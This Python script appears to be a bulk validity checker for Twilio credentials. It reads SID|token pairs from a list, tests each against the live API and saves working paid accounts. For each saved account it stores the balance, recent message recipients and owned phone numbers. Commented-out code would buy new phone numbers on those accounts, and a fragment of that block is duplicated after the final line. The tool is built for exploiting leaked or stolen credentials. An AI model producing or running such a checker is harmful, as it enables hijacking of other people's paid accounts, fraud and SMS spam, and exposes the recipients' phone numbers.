from twilio.rest import Client


def check_twilio_numbers(file_path):
    # Read the list of Twilio credentials from the input file
    with open(file_path, 'r') as file:
        credentials = file.read().splitlines()

    # Open the output file in append mode
    with open("TWILIO_VALID.txt", "a") as output_file:
        # Iterate over the credentials and perform mass checking
        for credential in credentials:
            # Extract the account SID and auth token from the credential
            account_sid, auth_token = credential.split('|')
            print(f"Checking account SID: {account_sid}|{auth_token}")

            try:
                # Initialize Twilio client with the account SID and auth token
                client = Client(account_sid, auth_token)

                # Fetch the account details
                account = client.api.accounts(account_sid).fetch()
                #typee = client.api.type
                balance = client.balance.fetch().balance
                currency = client.balance.fetch().currency
                date_created = account.date_created.strftime("%Y-%m-%d %H:%M:%S")
                date_updated = account.date_updated.strftime("%Y-%m-%d %H:%M:%S")
                # Print the details for each account
                
                print("Status: " + account.status)
                print("Type: "+account.type)
                print("Date Created: " + date_created)
                print("Date Updated: " + date_updated)
                print("Currency: " + currency)
                print("Balance: " + str(balance))
                print("-----------------------")

                if account.type == "Trial":
                    print("### TRIAL ACCOUNT NOT SAVE ###")
                else:
                 output_file.write(f"{account_sid}|{auth_token}\n")
                 output_file.write("Status: " + account.status + "\n")
                 output_file.write("Type: " + account.type + "\n")
                 output_file.write("Date Created: " + account.date_created.strftime("%Y-%m-%d %H:%M:%S") + "\n")
                 output_file.write("Date Updated: " + account.date_updated.strftime("%Y-%m-%d %H:%M:%S") + "\n")
                 output_file.write("Currency: " + currency + "\n")
                 output_file.write("Balance: " + str(balance) + "\n")

                 # Get history msg send 
                 messages = client.messages.list(limit=5)
                 print("RECORD SENT TO:")
                 output_file.write("RECORD SENT TO::\n")
                 for record in messages:
                  output_file.write(record.to + "\n")
                  print(record.to)
                  
                 # Get all friendly names or phone numbers from IncomingPhoneNumbers
                 incoming_numbers = client.incoming_phone_numbers.list()
                 print("Incoming Phone Numbers:")
                 output_file.write("Incoming Phone Numbers:\n")
                 for number in incoming_numbers:
                    output_file.write(number.phone_number+ "\n")
                    print(number.phone_number)
                 output_file.write("-----------------------\n")
                 print("-----------------------")

                 # # Search for available Toll-Free Numbers and buy a random number if available
                 # available_toll_free_numbers = client.available_phone_numbers('US').toll_free.list()
                 # if available_toll_free_numbers:
                 #     random_number = available_toll_free_numbers[0]
                 #     new_number = client.incoming_phone_numbers.create(phone_number=random_number.phone_number)
                 #     output_file.write("Purchased Toll-Free Number: " + new_number.phone_number + "\n")
                 #     print("Purchased Toll-Free Number: " + new_number.phone_number)
                 # else:
                 #     print("Error: No Toll-Free Numbers available")
                 # output_file.write("-----------------------\n")
                 # print("-----------------------")

                 # # Search for available Local Phone Numbers and buy a random number if available
                 # available_local_numbers = client.available_phone_numbers('US').local.list()
                 # if available_local_numbers:
                 #     random_number = available_local_numbers[0]
                 #     new_number = client.incoming_phone_numbers.create(phone_number=random_number.phone_number)
                 #     output_file.write("Purchased Local Number: " + new_number.phone_number + "\n")
                 #     print("Purchased Local Number: " + new_number.phone_number)
                 # else:
                 #     print("Error: No Local Numbers available")
                 # output_file.write("-----------------------\n")
                 # print("-----------------------")

                 # # Search for available Mobile Phone Numbers and buy a random number if available
                 # available_mobile_numbers = client.available_phone_numbers('US').mobile.list()
                 # if available_mobile_numbers:
                 #     random_number = available_mobile_numbers[0]
                 #     new_number = client.incoming_phone_numbers.create(phone_number=random_number.phone_number)
                 #     output_file.write("Purchased Mobile Number: " + new_number.phone_number + "\n")
                 #     print("Purchased Mobile Number: " + new_number.phone_number)
                 # else:
                 #     print("Error: No Mobile Numbers available")
                 # output_file.write("-----------------------\n")
                 # print("-----------------------")

                 # print("-----------------------")
            except Exception as e:
                print(f"Error: {account_sid}|{auth_token}")
                print(str(e))
                print("-----------------------")

# Get the input file path from the user
file_path = input("Input list file path: ")

# Call the function with the provided file path
check_twilio_numbers(file_path)            # if available_mobile_numbers:
                #     random_number = available_mobile_numbers[0]
                #     new_number = client.incoming_phone_numbers.create(phone_number=random_number.phone_number)
                #     output_file.write("Purchased Mobile Number: " + new_number.phone_number + "\n")
                #     print("Purchased Mobile Number: " + new_number.phone_number)
                # else:
                #     print("Error: No Mobile Numbers available")
                # output_file.write("-----------------------\n")
                # print("-----------------------")

              